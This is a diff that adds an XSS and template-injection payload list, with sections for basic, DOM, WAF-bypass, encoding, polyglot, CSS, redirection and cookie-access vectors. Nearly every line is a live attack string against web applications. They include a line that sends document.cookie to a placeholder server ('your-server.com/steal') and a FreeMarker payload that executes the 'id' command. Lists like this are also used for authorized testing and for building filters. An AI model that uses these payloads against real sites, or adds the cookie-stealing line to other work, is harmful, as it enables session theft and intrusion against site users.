@@ -1,0 +1,150 @@
+# ============ Basic XSS ============
+<script>alert('XSS')</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=confirm('XSS')>
+<svg/onload=alert('XSS')>
+<svg/onload=confirm('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+
+# ============ DOM-Based ============
+javascript:alert(document.domain)
+javascript:alert(window.location)
+javascript:alert(document.cookie)
+javascript:eval('alert(1)')
+'-alert(1)-'
+"alert(1)"
+${alert(1)}
+{alert(1)}
+data:text/html,<script>alert(1)</script>
+\'-alert(1)//
+</script><script>alert(1)</script>
+
+# ============ WAF Bypass ============
+<svg><script>alert&#40;1&#41</script>
+<iframe srcdoc="<script>alert(1)</script>">
+<img src="x" onerror="alert(1)">
+<a href="javas&#x09;cript:alert(1)">x</a>
+<script\x20>alert(1)</script>
+<script\x0D>alert(1)</script>
+<script\x0A>alert(1)</script>
+<sCrIpt\u200b>alert(1)</sCrIpt>
+<svg><script>alert&NewLine;(1)</script></svg>
+
+# ============ HTML5 ============
+<details/open/ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<video poster=javascript:alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<math><maction actiontype="statusline#javascript:alert(1)">
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+
+# ============ Encoding ============
+%3Cscript%3Ealert(1)%3C/script%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+¼script¾alert(1)¼/script¾
+﹤script﹥alert(1)﹤/script﹥
+＜script＞alert(1)＜/script＞
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+
+# ============ Polyglot ============
+jaVasCript:/*-/*/*\/*'/*"/**/(alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+<<script>alert(1);//<</script>
+<img/src="x"/onerror=alert(1)>
+javascript:"/*'/*`/*--></styles></script><svg/onload=alert(1)>"
+
+# ============ Advanced ============
+<img src='x'onerror='alert(1)'>
+<a href="javascript:alert(1)">x</a>
+<div onpointerover=alert(1)>XSS</div>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed code="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<script>fetch('https://your-server.com/steal?data='+btoa(document.cookie))</script>
+<svg onload=alert(1)>
+{{constructor.constructor("alert(1)")()}}
+<math><maction actiontype="statusline#https://google.com" xlink:href="javascript:alert(1)">CLICK
+
+# ============ Template Injection ============
+{{constructor.constructor('alert(1)')()}}
+#{alert(1)}
+<%alert(1)%>
+${"7".repeat(7)}
+{{7*7}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+
+# ============ Server-Side ============
+${7*7}
+<%= 7*7 %>
+
+# ============ CSS Injection ============
+<style>@import 'javascript:alert(1)';</style>
+<div style="background:url('javascript:alert(1)')">
+<style>@keyframes x{from{color:red;}to{color:blue;}}</style><div style="animation:x" onanimationstart="alert(1)"></div>
+
+# ============ URL-Based ============
+javascript://%0Aalert(1)
+javascript://%0Dalert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ============ FUZZ ============
+javascript:alert`1`
+"><iframe src="javascript:alert(1)">
+"><video><source onerror="alert(1)">
+
+# ============ VPN ============
+<img src=x onerror=alert(1)>
+<img src="x:xxx" onerror="alert(1)">
+<svg><script>alert(1)</script>
+
+# ============ Redirection ============
+document.location=
+document['location']=
+window.location=
+this["window"]["location"]=
+document.location.href=
+location.href=
+location=
+window.location.assign()
+window['location']['href']=
+document.location.replace()
+window.open("link", "_blank");
+
+# ============ Cookies =============
+document.cookie
+document['cookie']
+with(document)alert(cookie)
+doc\u0075ment.cookie
+doc\u0075ment['cookie']
+window["doc"+"ument"]["cookie"]
+
+# ============ Without closing tag ============
+<img/src/onerror=alert(1)>
+<svg/onload=alert(1)>
+<object/data=javascript:prompt(1)>
+<input/autofocus/onfocus=prompt(1)>
+<audio/src/onloadstart=alert(1)>
+<svg><animate/onbegin=alert(1)>
+<svg><animate/dur='1s'onend=alert(1)>
+<svg><set/onbegin=alert(1)>
+<svg><set/dur='1ms'onend=alert(1)>
+<marquee width=1 loop=1 onfinish=alert(1)>
+<details/open/ontoggle=confirm(1)>
+<details open ontoggle=confirm(1)>
+<details/ontoggle='alert(1)'/open>
+<details ontoggle=alert(1) open>
+
+# ============ Some random payloads ============
+"-alert(1)-"
+);alert(1)//
+';alert(1)//
+";alert(1)//
+"><img/src/onerror=alert(1)>//
+'><img/src/onerror=alert(1)>//
+>"@input="this.alert`1`
+>'@input='this.alert`1`
+&quot onerror='alert(1)'
+" onerror='alert(1)'
+
